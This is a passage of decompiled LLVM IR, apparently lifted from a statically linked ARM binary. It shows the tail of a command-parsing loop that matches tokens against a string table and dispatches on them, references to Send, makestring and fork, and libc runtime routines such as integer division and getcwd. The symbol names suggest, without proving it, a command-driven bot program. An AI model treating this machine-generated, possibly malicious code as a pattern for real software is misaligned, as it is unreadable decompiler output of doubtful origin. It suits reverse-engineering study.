  %v3_a848.pre-phi = phi i8* [ %.pre38, %dec_label_pc_a800.dec_label_pc_a834_crit_edge ], [ %v1_a828, %dec_label_pc_a818 ]
  %v2_a840.pre-phi = phi i32 [ %.pre37, %dec_label_pc_a800.dec_label_pc_a834_crit_edge ], [ %v2_a824, %dec_label_pc_a818 ]
  store i8 0, i8* %v3_a848.pre-phi, align 1
  store i32 %storemerge35.in, i32* @r1, align 4
  %v4_a85c = call i32 @strcpy(i8* %v3_a85c, i32 %storemerge35.in)
  %v1_a870 = add i32 %v2_a840.pre-phi, 1
  store i32 %v1_a870, i32* @r1, align 4
  %v4_a87c = call i32 @strcpy(i8* %storemerge35, i32 %v1_a870)
  %v8_a90c119 = load i32, i32* bitcast ([4 x i8]** @global_var_244d8.397 to i32*), align 4
  %v2_a910121 = icmp eq i32 %v8_a90c119, 0
  br i1 %v2_a910121, label %dec_label_pc_a918, label %dec_label_pc_a88c

dec_label_pc_a88c:                                ; preds = %dec_label_pc_a834, %dec_label_pc_a88c
  %v7_a90c124 = phi i32* [ %v7_a90c, %dec_label_pc_a88c ], [ bitcast ([4 x i8]** @global_var_244d8.397 to i32*), %dec_label_pc_a834 ]
  %storemerge22122 = phi i32 [ %v1_a8fc, %dec_label_pc_a88c ], [ 0, %dec_label_pc_a834 ]
  %v7_a894 = load i32, i32* %v7_a90c124, align 4
  %v2_a8a8 = inttoptr i32 %v7_a894 to i8*
  %v3_a8a8 = call i32 @__GI_strcasecmp(i8* %v2_a8a8, i32 %v2_a850)
  %v3_a8c4 = mul i32 %storemerge22122, 8
  %v2_a8cc = add i32 %v3_a8c4, add (i32 ptrtoint ([4 x i8]** @global_var_244d8.397 to i32), i32 4)
  %v1_a8d0 = inttoptr i32 %v2_a8cc to i32*
  %v2_a8d0 = load i32, i32* %v1_a8d0, align 4
  store i32 43256, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_a8d0)
  %v1_a8fc = add i32 %storemerge22122, 1
  %v5_a90c = mul i32 %v1_a8fc, 8
  %v6_a90c = add i32 %v5_a90c, ptrtoint ([4 x i8]** @global_var_244d8.397 to i32)
  %v7_a90c = inttoptr i32 %v6_a90c to i32*
  %v8_a90c = load i32, i32* %v7_a90c, align 4
  %v2_a910 = icmp eq i32 %v8_a90c, 0
  br i1 %v2_a910, label %dec_label_pc_a918, label %dec_label_pc_a88c

dec_label_pc_a918:                                ; preds = %dec_label_pc_a88c, %dec_label_pc_a834
  %v4_a928 = call i32 @__GI_strcasecmp(i8* %v3_a85c, i32 ptrtoint ([6 x i8]* @global_var_1a4a8.399 to i32))
  %v2_a930 = icmp eq i32 %v4_a928, 0
  br i1 %v2_a930, label %dec_label_pc_a378, label %dec_label_pc_a938

dec_label_pc_a938:                                ; preds = %dec_label_pc_a918
  %v6_a940 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1a4a0.392 to i32), i32 ptrtoint ([4 x i8]** @global_var_244d8.397 to i32), i32 %v4_a928, i32 ptrtoint (i32* @0 to i32))
  %v2_a950 = icmp eq i32 %v6_a940, 0
  br i1 %v2_a950, label %dec_label_pc_a3e8.lr.ph, label %dec_label_pc_a958

dec_label_pc_a958:                                ; preds = %dec_label_pc_a6d4, %dec_label_pc_a938
  %storemerge35.in = phi i32 [ %v6_a940, %dec_label_pc_a938 ], [ %v6_a704, %dec_label_pc_a6d4 ]
  %storemerge35 = inttoptr i32 %storemerge35.in to i8*
  %v2_a95c = load i8, i8* %storemerge35, align 1
  %v2_a960 = icmp eq i8 %v2_a95c, 0
  br i1 %v2_a960, label %dec_label_pc_a3e8.lr.ph, label %dec_label_pc_a714

; uselistorder directives
  uselistorder i8* %storemerge35, { 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %storemerge35.in, { 7, 3, 2, 4, 1, 0, 6, 5 }
  uselistorder i32* %v7_a90c, { 1, 0 }
  uselistorder i32 %v1_a8fc, { 1, 0 }
  uselistorder i32 %storemerge22122, { 1, 0 }
  uselistorder i32 %.pre37, { 1, 0 }
  uselistorder i32 %storemerge21, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge24, { 2, 1, 0, 3 }
  uselistorder i32 %v4_a6bc, { 1, 0, 2 }
  uselistorder i32 %v2_a658, { 2, 1, 0 }
  uselistorder i32 %v1_a5fc, { 1, 0 }
  uselistorder i32 %v3_a5c8, { 1, 0 }
  uselistorder i32 %storemerge19105, { 1, 0 }
  uselistorder i32 %v1_a5ac, { 1, 0 }
  uselistorder i32 %v2_a578, { 1, 0 }
  uselistorder i32 %v2_a568, { 1, 0 }
  uselistorder i32 %v1_a500, { 0, 2, 1 }
  uselistorder i32 %v2_a57894, { 1, 0 }
  uselistorder i32 %v3_a57493, { 1, 0 }
  uselistorder i32 %.pre136, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge17118, { 1, 0 }
  uselistorder i32 %v2_a414, { 1, 0 }
  uselistorder i32 %storemerge1630, { 1, 0 }
  uselistorder i32 %v2_a79c, { 1, 0 }
  uselistorder i32 %v2_a3d4, { 1, 0 }
  uselistorder i32 %v1_a2e4, { 1, 0 }
  uselistorder i32 %storemerge15, { 2, 0, 1 }
  uselistorder i32 %v3_a174, { 1, 0, 2 }
  uselistorder i32 %v2_a0e0, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-80.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1688, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_244d8.397 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_244d8.397, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32* @global_var_27864.289, { 1, 3, 4, 5, 0, 6, 7, 8, 2, 9, 10 }
  uselistorder i32* @global_var_24748.287, { 7, 8, 1, 5, 9, 10, 2, 0, 11, 3, 12, 4, 6, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_2784c.347, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* @global_var_27854.356, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_27844.382, { 1, 0 }
  uselistorder i32* @global_var_27840.298, { 1, 0 }
  uselistorder i32* @global_var_27848.318, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 ptrtoint ([16 x i8]* @global_var_1a3ec.345 to i32), { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 ()* @__getpid, { 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 0, 1 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a30c.294 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8** %argv, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a958, { 1, 0 }
  uselistorder label %dec_label_pc_a88c, { 1, 0 }
  uselistorder label %dec_label_pc_a800, { 1, 0 }
  uselistorder label %dec_label_pc_a7e8, { 1, 0 }
  uselistorder label %dec_label_pc_a744, { 1, 0 }
  uselistorder label %dec_label_pc_a634, { 1, 0 }
  uselistorder label %dec_label_pc_a618, { 1, 0 }
  uselistorder label %dec_label_pc_a5c4, { 1, 0 }
  uselistorder label %dec_label_pc_a50c, { 1, 0 }
  uselistorder label %dec_label_pc_a3e8, { 1, 0 }
  uselistorder label %dec_label_pc_a3e8.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_a378, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_a294, { 1, 0 }
  uselistorder label %dec_label_pc_a1d4, { 1, 0 }
  uselistorder label %dec_label_pc_a1bc, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a09c, { 1, 0 }
  uselistorder label %dec_label_pc_a028, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_a9d4 = load i32, i32* @r1, align 4
  %v1_a9d4 = icmp slt i32 %v0_a9d4, 0
  %v2_a9d4 = icmp eq i32 %v0_a9d4, 0
  %v2_a9d8 = xor i32 %v0_a9d4, %arg1
  br i1 %v2_a9d4, label %dec_label_pc_aaec, label %dec_label_pc_a9e0

dec_label_pc_a9e0:                                ; preds = %entry
  br i1 %v1_a9d4, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_a9e0
  %v2_a9e0 = sub i32 0, %v0_a9d4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_a9e0, %bb
  %v1_aaac = phi i32 [ %v2_a9e0, %bb ], [ %v0_a9d4, %dec_label_pc_a9e0 ]
  %v1_a9e4 = add i32 %v1_aaac, -1
  %v7_a9e4 = icmp eq i32 %v1_aaac, 1
  br i1 %v7_a9e4, label %dec_label_pc_aa8c, label %dec_label_pc_a9ec

dec_label_pc_a9ec:                                ; preds = %thread-pre-split
  %v1_a9ec = icmp slt i32 %arg1, 0
  br i1 %v1_a9ec, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_a9ec
  %v2_a9f0 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_a9ec, %bb85
  %v0_aae0 = phi i32 [ %arg1, %dec_label_pc_a9ec ], [ %v2_a9f0, %bb85 ]
  %v3_a9f4 = icmp uge i32 %v0_aae0, %v1_aaac
  %v9_a9f4 = icmp eq i32 %v0_aae0, %v1_aaac
  %v2_a9f8 = xor i1 %v3_a9f4, true
  %v3_a9f8 = or i1 %v9_a9f4, %v2_a9f8
  br i1 %v3_a9f8, label %dec_label_pc_aa98, label %dec_label_pc_a9fc

dec_label_pc_a9fc:                                ; preds = %bb86
  %v2_a9fc = and i32 %v1_a9e4, %v1_aaac
  %v4_a9fc = icmp eq i32 %v2_a9fc, 0
  br i1 %v4_a9fc, label %dec_label_pc_aaa8, label %dec_label_pc_aa04

dec_label_pc_aa04:                                ; preds = %dec_label_pc_a9fc
  %v3_aa04 = icmp ult i32 %v1_aaac, 536870912
  br i1 %v3_aa04, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_aa04
  %v4_aa08 = mul i32 %v1_aaac, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_aa04, %.thread
  %v0_aa28.pr40.ph = phi i32 [ %v4_aa08, %.thread ], [ %v1_aaac, %dec_label_pc_aa04 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_aa04 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_aa28.pr40 = phi i32 [ %v4_aa1c, %bb89 ], [ %v0_aa28.pr40.ph, %.preheader.preheader ]
  %v1_aa20 = phi i32 [ %v4_aa20, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_aa14 = icmp ugt i32 %v0_aa28.pr40, 268435455
  br i1 %v2_aa14, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_aa28thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_aa18 = icmp ult i32 %v0_aa28.pr40, %v0_aae0
  br i1 %v4_aa18, label %bb88, label %dec_label_pc_aa28thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_aa1c = and i32 %v0_aa28.pr40, 268435456
  %v3_aa1c = icmp eq i32 %v2_aa1c, 0
  %v4_aa1c = mul i32 %v0_aa28.pr40, 16
  br i1 %v3_aa1c, label %bb89, label %dec_label_pc_aa28.loopexit

bb89:                                             ; preds = %bb88
  %v2_aa20 = and i32 %v1_aa20, 268435456
  %v3_aa20 = icmp eq i32 %v2_aa20, 0
  %v4_aa20 = mul i32 %v1_aa20, 16
  br i1 %v3_aa20, label %.preheader, label %dec_label_pc_aa28thread-pre-split.loopexit.loopexit

dec_label_pc_aa28thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_aa3452.ph = phi i32 [ %v1_aa20, %bb87 ], [ %v4_aa20, %bb89 ]
  %v0_aa28.pr42.ph = phi i32 [ %v0_aa28.pr40, %bb87 ], [ %v4_aa1c, %bb89 ]
  br label %dec_label_pc_aa28thread-pre-split.loopexit

dec_label_pc_aa28thread-pre-split.loopexit:       ; preds = %dec_label_pc_aa28thread-pre-split.loopexit.loopexit, %.thread3
  %v1_aa3452 = phi i32 [ %v1_aa20, %.thread3 ], [ %v1_aa3452.ph, %dec_label_pc_aa28thread-pre-split.loopexit.loopexit ]
  %v0_aa28.pr42 = phi i32 [ %v0_aa28.pr40, %.thread3 ], [ %v0_aa28.pr42.ph, %dec_label_pc_aa28thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_aa28thread-pre-split

dec_label_pc_aa28thread-pre-split:                ; preds = %dec_label_pc_aa28thread-pre-split.loopexit, %bb91
  %v1_aa3450 = phi i32 [ %v1_aa3452, %dec_label_pc_aa28thread-pre-split.loopexit ], [ %v3_aa34, %bb91 ]
  %v2_aa2c48 = phi i32 [ %v0_aae0, %dec_label_pc_aa28thread-pre-split.loopexit ], [ %v2_aa2c, %bb91 ]
  %v0_aa28.pr = phi i32 [ %v0_aa28.pr42, %dec_label_pc_aa28thread-pre-split.loopexit ], [ %v3_aa30, %bb91 ]
  br label %dec_label_pc_aa28

dec_label_pc_aa28.loopexit:                       ; preds = %bb88
  br label %dec_label_pc_aa28

dec_label_pc_aa28:                                ; preds = %dec_label_pc_aa28.loopexit, %dec_label_pc_aa28thread-pre-split
  %v1_aa34 = phi i32 [ %v1_aa3450, %dec_label_pc_aa28thread-pre-split ], [ %v1_aa20, %dec_label_pc_aa28.loopexit ]
  %v2_aa2c = phi i32 [ %v2_aa2c48, %dec_label_pc_aa28thread-pre-split ], [ %v0_aae0, %dec_label_pc_aa28.loopexit ]
  %v1_aa30 = phi i32 [ %v0_aa28.pr, %dec_label_pc_aa28thread-pre-split ], [ %v4_aa1c, %dec_label_pc_aa28.loopexit ]
  %v2_aa28 = icmp slt i32 %v1_aa30, 0
  br i1 %v2_aa28, label %dec_label_pc_aa3c, label %bb90

bb90:                                             ; preds = %dec_label_pc_aa28
  %v4_aa2c = icmp ult i32 %v1_aa30, %v2_aa2c
  br i1 %v4_aa2c, label %bb91, label %dec_label_pc_aa3c

bb91:                                             ; preds = %bb90
  %v3_aa30 = mul i32 %v1_aa30, 2
  %v2_aa34 = icmp slt i32 %v1_aa34, 0
  %v3_aa34 = mul i32 %v1_aa34, 2
  br i1 %v2_aa34, label %dec_label_pc_aa3c, label %dec_label_pc_aa28thread-pre-split

dec_label_pc_aa3c:                                ; preds = %bb90, %dec_label_pc_aa28, %bb91
  %v2_aa4863 = phi i32 [ %v3_aa34, %bb91 ], [ %v1_aa34, %bb90 ], [ %v1_aa34, %dec_label_pc_aa28 ]
  %v1_aa4055 = phi i32 [ %v3_aa30, %bb91 ], [ %v1_aa30, %bb90 ], [ %v1_aa30, %dec_label_pc_aa28 ]
  br label %dec_label_pc_aa40

dec_label_pc_aa40:                                ; preds = %.thread13, %dec_label_pc_aa3c
  %v1_aa74 = phi i32 [ %v4_aa74, %.thread13 ], [ %v2_aa4863, %dec_label_pc_aa3c ]
  %v1_aa48 = phi i32 [ %v1_aa84, %.thread13 ], [ 0, %dec_label_pc_aa3c ]
  %v1_aa78 = phi i32 [ %v4_aa78, %.thread13 ], [ %v1_aa4055, %dec_label_pc_aa3c ]
  %v1_aa44 = phi i32 [ %v0_aa70, %.thread13 ], [ %v0_aae0, %dec_label_pc_aa3c ]
  %v3_aa40 = icmp ult i32 %v1_aa44, %v1_aa78
  br i1 %v3_aa40, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_aa40
  %v3_aa44 = sub i32 %v1_aa44, %v1_aa78
  %v3_aa48 = or i32 %v1_aa48, %v1_aa74
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_aa40, %bb92
  %v1_aa50 = phi i32 [ %v1_aa44, %dec_label_pc_aa40 ], [ %v3_aa44, %bb92 ]
  %v1_aa54 = phi i32 [ %v1_aa48, %dec_label_pc_aa40 ], [ %v3_aa48, %bb92 ]
  %v4_aa4c = udiv i32 %v1_aa78, 2
  %v6_aa4c = icmp ult i32 %v1_aa50, %v4_aa4c
  br i1 %v6_aa4c, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_aa50 = urem i32 %v1_aa78, 2
  %v4_aa50 = icmp eq i32 %v3_aa50, 0
  %v6_aa50 = sub i32 %v1_aa50, %v4_aa4c
  br i1 %v4_aa50, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_aa54 = udiv i32 %v1_aa74, 2
  %v6_aa54 = or i32 %v1_aa54, %v5_aa54
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_aa5c = phi i32 [ %v6_aa50, %bb93 ], [ %v1_aa50, %.thread8 ], [ %v6_aa50, %bb94 ]
  %v1_aa60 = phi i32 [ %v1_aa54, %bb93 ], [ %v1_aa54, %.thread8 ], [ %v6_aa54, %bb94 ]
  %v4_aa58 = udiv i32 %v1_aa78, 4
  %v6_aa58 = icmp ult i32 %v1_aa5c, %v4_aa58
  br i1 %v6_aa58, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_aa5c = and i32 %v1_aa78, 2
  %v4_aa5c = icmp eq i32 %v3_aa5c, 0
  %v6_aa5c = sub i32 %v1_aa5c, %v4_aa58
  br i1 %v4_aa5c, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_aa60 = udiv i32 %v1_aa74, 4
  %v6_aa60 = or i32 %v1_aa60, %v5_aa60
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_aa68 = phi i32 [ %v6_aa5c, %bb95 ], [ %v1_aa5c, %.thread9 ], [ %v6_aa5c, %bb96 ]
  %v1_aa6c = phi i32 [ %v1_aa60, %bb95 ], [ %v1_aa60, %.thread9 ], [ %v6_aa60, %bb96 ]
  %v4_aa64 = udiv i32 %v1_aa78, 8
  %v6_aa64 = icmp ult i32 %v1_aa68, %v4_aa64
  br i1 %v6_aa64, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_aa68 = and i32 %v1_aa78, 4
  %v4_aa68 = icmp eq i32 %v3_aa68, 0
  %v6_aa68 = sub i32 %v1_aa68, %v4_aa64
  br i1 %v4_aa68, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_aa6c = udiv i32 %v1_aa74, 8
  %v6_aa6c = or i32 %v1_aa6c, %v5_aa6c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_aa84 = phi i32 [ %v1_aa6c, %bb97 ], [ %v1_aa6c, %.thread10 ], [ %v6_aa6c, %bb98 ]
  %v0_aa70 = phi i32 [ %v6_aa68, %bb97 ], [ %v1_aa68, %.thread10 ], [ %v6_aa68, %bb98 ]
  %v2_aa70 = icmp eq i32 %v0_aa70, 0
  br i1 %v2_aa70, label %dec_label_pc_aa80, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_aa74, 16
  br i1 %tmp, label %dec_label_pc_aa80, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_aa74 = udiv i32 %v1_aa74, 16
  %v4_aa78 = udiv i32 %v1_aa78, 16
  br label %dec_label_pc_aa40

dec_label_pc_aa80:                                ; preds = %thread-pre-split12, %bb99
  %v1_aa80 = icmp slt i32 %v2_a9d8, 0
  br i1 %v1_aa80, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_aa80
  %v2_aa84 = sub i32 0, %v1_aa84
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_aa8c, %dec_label_pc_aa80, %bb100
  %v1_aa88 = phi i32 [ %v1_aa84, %dec_label_pc_aa80 ], [ %v2_aa84, %bb100 ], [ %arg1, %dec_label_pc_aa8c ], [ %v2_aa90, %bb101 ], [ %v1_aaa480, %bb103 ], [ %v2_aaa0, %bb104 ]
  ret i32 %v1_aa88

dec_label_pc_aa8c:                                ; preds = %thread-pre-split
  br i1 %v1_a9d4, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_aa8c
  %v2_aa90 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_aa98:                                ; preds = %bb86
  br i1 %v3_a9f4, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_aa98
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_aa98, %bb102
  %v1_aaa480 = phi i32 [ %arg1, %dec_label_pc_aa98 ], [ 0, %bb102 ]
  br i1 %v9_a9f4, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_aa9c = ashr i32 %v2_a9d8, 31
  %v2_aaa0 = or i32 %v4_aa9c, 1
  br label %.thread16

dec_label_pc_aaa8:                                ; preds = %dec_label_pc_a9fc
  %v2_aaa8 = icmp ugt i32 %v1_aaac, 65535
  br i1 %v2_aaa8, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_aaa8
  %v2_aaac = and i32 %v1_aaac, 32768
  %v3_aaac = icmp eq i32 %v2_aaac, 0
  %v4_aaac = udiv i32 %v1_aaac, 65536
  br i1 %v3_aaac, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_aaa8
  %v0_aab870 = phi i32 [ %v1_aaac, %dec_label_pc_aaa8 ], [ %v4_aaac, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_aabc = phi i32 [ %v0_aab870, %.thread19 ], [ %v4_aaac, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_aab8 = icmp ugt i32 %v1_aabc, 255
  br i1 %v2_aab8, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_aabc = and i32 %v1_aabc, 128
  %v3_aabc = icmp eq i32 %v2_aabc, 0
  %v4_aabc = udiv i32 %v1_aabc, 256
  br i1 %v3_aabc, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_aac0 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_aacc = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_aac0, %bb108 ]
  %v1_aac8 = phi i32 [ %v1_aabc, %bb106 ], [ %v4_aabc, %bb107 ], [ %v4_aabc, %bb108 ]
  %v2_aac4 = icmp ugt i32 %v1_aac8, 15
  br i1 %v2_aac4, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_aac8 = and i32 %v1_aac8, 8
  %v3_aac8 = icmp eq i32 %v2_aac8, 0
  %v4_aac8 = udiv i32 %v1_aac8, 16
  br i1 %v3_aac8, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_aacc = add nsw i32 %v1_aacc, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_aad4 = phi i32 [ %v1_aacc, %.thread20 ], [ %v1_aacc, %bb109 ], [ %v2_aacc, %bb110 ]
  %v5_aad8 = phi i32 [ %v1_aac8, %.thread20 ], [ %v4_aac8, %bb109 ], [ %v4_aac8, %bb110 ]
  %v2_aad0 = icmp ugt i32 %v5_aad8, 3
  %v7_aad0 = icmp eq i32 %v5_aad8, 4
  %v2_aad4 = xor i1 %v7_aad0, true
  %v3_aad4 = and i1 %v2_aad0, %v2_aad4
  br i1 %v3_aad4, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_aad4 = add nsw i32 %v4_aad4, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_aad8 = phi i32 [ %v4_aad4, %.thread21 ], [ %v5_aad4, %bb111 ]
  %v2_aad8 = xor i1 %v2_aad0, true
  %v3_aad8 = or i1 %v7_aad0, %v2_aad8
  br i1 %v3_aad8, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_aad8 = udiv i32 %v5_aad8, 2
  %v9_aad8 = add i32 %v4_aad8, %v8_aad8
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_aae0 = phi i32 [ %v4_aad8, %bb112 ], [ %v9_aad8, %bb113 ]
  %v1_aadc = icmp slt i32 %v2_a9d8, 0
  %v6_aae0 = lshr i32 %v0_aae0, %v1_aae0
  %v2_aae4 = sub i32 0, %v6_aae0
  %v2_aae4.v6_aae0 = select i1 %v1_aadc, i32 %v2_aae4, i32 %v6_aae0
  ret i32 %v2_aae4.v6_aae0

dec_label_pc_aaec:                                ; preds = %entry
  %v0_aaf0 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_aad8, { 1, 0 }
  uselistorder i1 %v7_aad0, { 1, 0 }
  uselistorder i32 %v4_aac8, { 1, 0 }
  uselistorder i32 %v1_aac8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_aabc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_aabc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_aaac, { 1, 0 }
  uselistorder i32 %v0_aa70, { 1, 0 }
  uselistorder i32 %v4_aa64, { 1, 0 }
  uselistorder i32 %v1_aa6c, { 1, 2, 0 }
  uselistorder i32 %v4_aa58, { 1, 0 }
  uselistorder i32 %v1_aa60, { 1, 2, 0 }
  uselistorder i32 %v4_aa4c, { 1, 0 }
  uselistorder i32 %v1_aa54, { 1, 2, 0 }
  uselistorder i32 %v1_aa78, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_aa48, { 1, 0 }
  uselistorder i32 %v1_aa74, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_aa34, { 1, 0 }
  uselistorder i32 %v3_aa30, { 1, 0 }
  uselistorder i32 %v1_aa30, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_aa2c, { 1, 0 }
  uselistorder i32 %v1_aa34, { 1, 2, 0, 3 }
  uselistorder i32 %v4_aa20, { 1, 0 }
  uselistorder i32 %v4_aa1c, { 2, 1, 0 }
  uselistorder i32 %v1_aa20, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_aa28.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_a9f4, { 1, 0 }
  uselistorder i32 %v1_aaac, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_a9d8, { 1, 0, 2 }
  uselistorder i32 %v0_a9d4, { 2, 1, 0, 4, 3 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_aa80, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_aa3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa28thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_ab04 = sdiv i32 %arg1, %arg2
  ret i32 %v2_ab04
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_ab20 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_ab20
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_ab2c = load i32, i32* @r4, align 4
  %v6_ab2c = load i32, i32* @r5, align 4
  %v9_ab2c = load i32, i32* @r6, align 4
  %v12_ab2c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_ab30 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_ab40 = icmp eq i32 %arg1, 0
  br i1 %v2_ab30, label %dec_label_pc_ab40, label %dec_label_pc_ab78

dec_label_pc_ab40:                                ; preds = %entry
  br i1 %v2_ab40, label %dec_label_pc_ab64, label %dec_label_pc_ab48

dec_label_pc_ab48:                                ; preds = %dec_label_pc_ab40
  %v0_ab4c = call i32 @__aeabi_read_tp()
  %v3_ab50 = load i16, i16* @global_var_24070.401, align 2
  %v4_ab50 = sext i16 %v3_ab50 to i32
  %v0_ab58 = load i32, i32* @r6, align 4
  store i32 %v0_ab58, i32* @r4, align 4
  %v3_ab5c = add i32 %v4_ab50, %v0_ab4c
  %v4_ab5c = inttoptr i32 %v3_ab5c to i32*
  store i32 22, i32* %v4_ab5c, align 4
  br label %dec_label_pc_ac14

dec_label_pc_ab64:                                ; preds = %dec_label_pc_ab40
  %v0_ab64 = call i32 @__GI_getpagesize()
  %v5_ab6c = icmp slt i32 %v0_ab64, 4096
  br i1 %v5_ab6c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_ab64
